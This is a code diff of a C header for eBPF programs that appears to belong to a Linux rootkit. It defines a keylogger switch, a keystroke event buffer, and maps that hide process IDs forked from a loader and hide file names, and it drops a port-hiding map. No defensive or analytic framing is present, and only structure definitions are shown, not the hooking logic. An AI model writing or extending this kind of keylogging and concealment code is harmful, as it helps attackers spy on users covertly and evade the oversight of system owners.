@@ -3,13 +3,13 @@
 
 #include "config.h"
 #include <bpf/bpf_helpers.h>
+#include <bpf/bpf_core_read.h>
 #include <vmlinux.h>
 
-#define CONFIG_MAP_MAX_ENTRIES 10
-#define EVENTS_MAP_MAX_ENTRIES 256 * 1024
+#define CONFIG_MAP_MAX_ENTRIES        10
+#define EVENTS_MAP_MAX_ENTRIES        256 * 1024
 #define KEYLOG_EVENTS_MAP_MAX_ENTRIES 128 * 1024
-#define HIDE_NAMES_MAP_MAX_ENTRIES 256
-#define HIDE_PORTS_MAP_MAX_ENTRIES 64
+#define HIDE_NAMES_MAP_MAX_ENTRIES    256
 
 enum config_keys {
     KEYLOGGER_ENABLED = 0,
@@ -48,7 +48,7 @@ struct {
 
 /**
  * @brief Map to store target PIDs to hide.
- * 
+ *
  * This map is tracking all PIDs of process forked from loader.
  *
  * Key: pid_t PID
@@ -72,7 +72,7 @@ struct {
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, HIDE_NAMES_MAP_MAX_ENTRIES);
-    __type(key, char[MAX_NAME_LEN]);
+    __type(key, char[MAX_HIDDEN_FILE_NAME_LEN]);
     __type(value, u8);
 } hide_names_map SEC(".maps");
 
